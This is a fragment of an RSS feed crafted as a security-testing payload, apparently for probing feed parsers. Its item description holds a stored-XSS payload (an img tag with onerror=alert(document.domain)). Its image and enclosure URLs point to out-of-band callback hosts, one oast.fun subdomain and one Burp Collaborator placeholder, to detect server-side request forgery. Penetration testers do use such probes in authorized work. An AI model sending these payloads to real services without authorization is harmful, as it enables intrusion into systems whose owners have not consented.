  <channel>
    <title>Logic Test</title>
    <link>http://example.com</link>
    <description>Testing for SSRF and XSS without DTD</description>
    
    <item>
      <title>SSRF & XSS Check</title>
      <link>http://example.com</link>
      
      <!-- ATTACK 1: XSS -->
      <!-- If this pops an alert, you have Stored XSS -->
      <description><![CDATA[ 
        <h3>Test</h3>
        <img src=x onerror=alert(document.domain)> 
      ]]></description>
      
      <!-- ATTACK 2: SSRF via Image Tag -->
      <!-- Some parsers scrape this URL to show a thumbnail -->
      <image>
        <url>http://http://phsrenjcxgefqbuibhlmmzh9nflr3gcop.oast.fun/image_test.jpg</url>
        <title>Test Image</title>
        <link>http://example.com</link>
      </image>

      <!-- ATTACK 3: SSRF via Enclosure -->
      <!-- The server might try to download this to check file size -->
      <enclosure url="http://YOUR_BURP_COLLABORATOR.oastify.com/enclosure_test.mp3" length="1234" type="audio/mpeg" />
    </item>
  </channel>
